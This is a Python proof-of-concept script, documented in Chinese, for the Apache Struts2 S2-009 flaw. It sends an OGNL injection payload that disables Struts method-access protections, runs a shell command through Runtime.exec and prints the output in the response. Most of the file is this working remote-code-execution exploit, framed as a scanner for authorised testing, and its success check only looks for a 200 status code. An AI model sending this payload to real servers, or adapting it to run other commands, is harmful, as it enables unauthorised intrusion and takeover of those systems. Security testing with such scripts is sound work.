"""
Struts2 S2-009 POC 检测脚本

漏洞描述：
Apache Struts2 的 REST 插件存在远程代码执行漏洞（S2-009）。
攻击者可以通过构造恶意的请求参数来执行任意命令。

影响版本：
- Struts 2.1.0 - Struts 2.3.4.1

检测原理：
通过向 /ajax/example5.action 端点发送包含 OGNL 表达式的恶意请求，
尝试执行 'ls' 命令。如果服务器返回 200 状态码，则说明可能存在漏洞。

使用方法：
    python struts2_009_poc.py
    或在代码中调用 poc(url) 函数

参数说明：
    url: 目标URL，如 http://127.0.0.1:8080
    timeout: 请求超时时间（秒），默认10秒

返回值：
    (True, '存在漏洞') - 检测到漏洞
    (False, '安全') - 未检测到漏洞
    (False, '扫描失败 - 错误信息') - 扫描过程中出现错误

注意：
    此POC仅用于安全测试和授权的渗透测试，请勿用于非法用途。
"""

import requests

def poc(url, timeout=10):
    """
    检测目标是否存在 Struts2 S2-009 漏洞
    
    Args:
        url: 目标URL，如 http://127.0.0.1:8080
        timeout: 请求超时时间（秒），默认10秒
    
    Returns:
        tuple: (是否存在漏洞, 结果消息)
    """
    print('test {} --> struts2_009'.format(url))
    url += "/ajax/example5.action"
    exp = "?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27ls%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)] HTTP/1.1"
    url += exp
    try:
        resp = requests.get(url, timeout=timeout)
        print(resp)
        if resp.status_code == 200:
            print('test --> struts2_009 Success!')
            return True, 'Struts2 S2-009: 存在漏洞'
    except Exception as e:
        print('test --> struts2_009 Failed!')
        return False, f'Struts2 S2-009: 扫描失败 - {str(e)}'
    return False, 'Struts2 S2-009: 安全'

if __name__ == "__main__":
    print(poc('http://127.0.0.1:8080'))
